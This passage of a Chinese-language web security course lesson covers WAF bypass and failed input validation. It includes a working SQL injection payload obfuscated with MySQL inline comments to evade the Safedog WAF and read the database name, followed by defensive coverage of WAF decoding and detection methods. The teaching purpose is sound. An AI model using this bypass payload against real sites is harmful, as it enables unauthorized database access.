 *<span class="hljs-keyword">echo</span>* <span class="hljs-variable">$row</span>[‘<span class="hljs-number">0</span>’] . “&amp;nbsp” . <span class="hljs-variable">$row</span>[‘<span class="hljs-number">1</span>’];
 *<span class="hljs-keyword">echo</span>* “&lt;br /&gt;”;
}
*<span class="hljs-keyword">echo</span>* “&lt;br/&gt;”;
*<span class="hljs-keyword">echo</span>* <span class="hljs-variable">$query</span>;
<span class="hljs-title function_ invoke__">mysql_close</span>(<span class="hljs-variable">$con</span>);
*<span class="hljs-meta">?&gt;</span>*
</code></pre>

<p>我们尝试使用<code>payload</code>为：</p>

<pre><code class="language-sql hljs">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">' and 1=2 union select database(),2 --+
</span></code></pre>

<p>会发现被安全狗拦截了，但我们对它进行修改为：</p>

<pre><code class="language-sql hljs">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">'//*!14400and*//1=2//*//*//union//*!88888cas*//*/%0a*a*//select//**//*//*//database(//*%%!AJEST%%%%*//),2//**/--+/
</span></code></pre>

<p>注意，其中<code>/*! ….*/</code>是MySQL为了保持兼容，它把一些特有的仅在MySQL上用的语句放在了<code>/*!….*/</code>中，目的是这些语句在其他数据库中是不会被执行，但在MySQL中会被执行。</p>

<p>利用这个组合，我们就能绕过WAF，成功获取到当前的数据库的名称。</p>

<p>既然有这么多WAF绕过方式，那么在安全实践中，WAF厂商是如何防范自己的WAF被绕过的呢？</p>

<h2 id="安全实践-如何防范自己的waf被绕过">安全实践：如何防范自己的WAF被绕过？</h2>

<p>Web服务器在对外提供各种应用服务时，经常会遇到这样的情况：请求的payload经过混淆或者编码，想要绕过Web安全防火墙。如果在HTTP请求中添加编码，很可能会绕过WAF规则，导致数据泄露风险。那本应该被拦截的请求，还是得到了对应的响应数据。</p>

<p>通常云WAF厂商都会自研解码引擎。针对不同使用场景，比如互联网、金融、政企，提供不同的解码组合方案。</p>

<p>我们以具有代表性的华为云WAF为例，看看他们的解码说明。</p>

<p><img src="assets/752ad454008d4ef5931bc295c0e51648.jpg" alt="图片"></p>

<p>可以看到，华为云WAF可以做到将11种编码还原，使得通过这些编码/混淆绕过WAF的方法变得无效。</p>

<p>我们再看一个例子，基于<code>nginx+lua</code>实现针对<code>http payload</code>编解码操作，来加深理解。</p>

<pre><code class="language-plain">#uri转码
local function _uri_decode(value)
    local value = tostring(value)
    return ngx.unescape_uri(value)
end 
local function _uri_encode(value)
    local value = tostring(value)
    return ngx.escape_uri(value)
end
</code></pre>

<p>这是对URI解码以及编码的操作。在接收到payload后，进行URI解码可以帮助WAF系统，判断出借助URI编码尝试绕过的攻击行为，从而使得该WAF的防御效果更好。</p>

<p>好了，到这里，我们对几种失效的输入检测，以及其中的巨大危害，都了解得比较清楚了。那么，除了云厂商自己的WAF绕过安全实践外，还应该如何检测这些漏洞呢？</p>

<h2 id="应对失效的输入检测的方式">应对失效的输入检测的方式</h2>

<p>对于输入验证问题，我们可以用多种方法来检测它。常见的方法有4种，包括静态分析、模糊测试、源代码分析、架构及设计审查。</p>

<p>一般来讲，这4种方式虽然都致力于解决失效的输入检测问题，但是它们各自擅长的领域是不同的，比如即使经过源代码分析，模糊测试依然能够发现新的问题；而单纯通过模糊测试，也很有可能无法覆盖到源代码分析这种白盒测试的结果。因此，这4种方式组合使用的效果更好。</p>

<p>接下来，我们一一学习下这4种方式。</p>

<h3 id="静态分析">静态分析</h3>

<p>使用自动静态分析，可以检测到一些不正确的输入验证情况。</p>

<p>有的静态分析工具，允许用户指定应用的类型，针对用户选择的应用类型运行特定的检测方法。</p>

<p>有的静态分析工具，还会内置比较知名的验证框架的信息，例如Struts框架。如果这个工具分析判断出某个输入验证调用了已知的框架，那就可以降低该框架有效验证的探测的优先级。进而允许设计者专注于软件中输入验证的盲点位置。</p>

<h3 id="模糊测试">模糊测试</h3>

<p>除了静态分析之外，模糊测试技术也可以用来检测输入验证是否存在错误。当我们向一个软件提供意外的输入时，软件可能会变得“崩溃”、不稳定，并且可能会生成应用程序控制的错误消息。</p>

<p>如果出现这些异常或者解释器生成了错误信息，那就表明应用程序对输入的检查和处理并未达到应用程序内在的逻辑需求。</p>

<h3 id="源代码分析">源代码分析</h3>

<p>我们还可以使用源代码弱点分析器对源代码进行自动分析，当然我们也可以不利用工具，亲自进行手动分析。</p>

<h3 id="架构及设计审查">架构及设计审查</h3>

<p>除了静态分析、模糊测试和源代码分析方法外，我们还可以在架构及设计审查时检查输入验证的正确性。具体方法是：根据标准对系统进行检查（IEEE 1028 标准）（可应用于需求、设计、源代码等）、形式化方法/正确构造、攻击建模等方法。</p>

<h2 id="总结">总结</h2>

<p>到这里，我们就把失效的输入检测相关的内容学习完了。</p>

<p>在第19和第20讲这两节课里，我和你分享了6种失效的输入检测，并展开了其中比较复杂的WAF及绕过。我把这些知识点，给你放到了一张脑图中，你可以保存下来，随时查看。</p>

<p><img src="assets/38055a2ff6774150abf475c27277cc60.jpg" alt="图片"></p>

<p>对于WAF绕过，我们今天学习的也只是9种常见的方式。但不论是哪种方式，绕过的核心思想，都是运用WAF和服务端的协议解析差异，使得服务端解析了我们的消息，而WAF无法解析所以跳过检测。</p>

<h2 id="思考">思考</h2>

<p>在这一节课，我们学习了很多WAF绕过方式，但是WAF绕过与反绕过一直是在对抗升级的，只学习这些技巧还远远不够，那么从攻击者视角来看，WAF绕过的本质是什么呢？利用的本质问题又是什么呢？</p>

<p>欢迎在评论区留下你的思考。如果你觉得今天的内容对你有所帮助的话，欢迎你把课程分享给其他同事或朋友，我们共同学习进步！</p>
</div>
                        </div>

                </div>

            </div>
        </div>
    </div>
</div>

<a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v652eace1692a40cfa3763df669d7439c1639079717194" integrity="sha512-Gi7xpJR8tSkrpF7aordPZQlW2DLtzUlZcumS8dMQjwDHEnw9I7ZLyiOj/6tZStRBGtGgN6ceN6cMH8z7etPGlw==" data-cf-beacon='{"rayId":"709ba3a57eaefbdc","version":"2021.12.0","r":1,"token":"1f5d475227ce4f0089a7cff1ab17c0f5","si":100}' crossorigin="anonymous"></script>
</body>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NPSEEVD756"></script>
<script>
    window.dataLayer = window.dataLayer || [];

    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'G-NPSEEVD756');
    var path = window.location.pathname
    var cookie = getCookie("lastPath");
    console.log(path)
    if (path.replace("/", "") === "") {
        if (cookie.replace("/", "") !== "") {
            console.log(cookie)
            document.getElementById("tip").innerHTML = "<a href='" + cookie + "'>跳转到上次进度</a>"
        }
    } else {
        setCookie("lastPath", path)
    }

    function setCookie(cname, cvalue) {
        var d = new Date();
        d.setTime(d.getTime() + (180 * 24 * 60 * 60 * 1000));
        var expires = "expires=" + d.toGMTString();
        document.cookie = cname + "=" + cvalue + "; " + expires + ";path = /";
    }

    function getCookie(cname) {
        var name = cname + "=";
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i].trim();
            if (c.indexOf(name) === 0) return c.substring(name.length, c.length);
        }
        return "";
    }

</script>

</html>
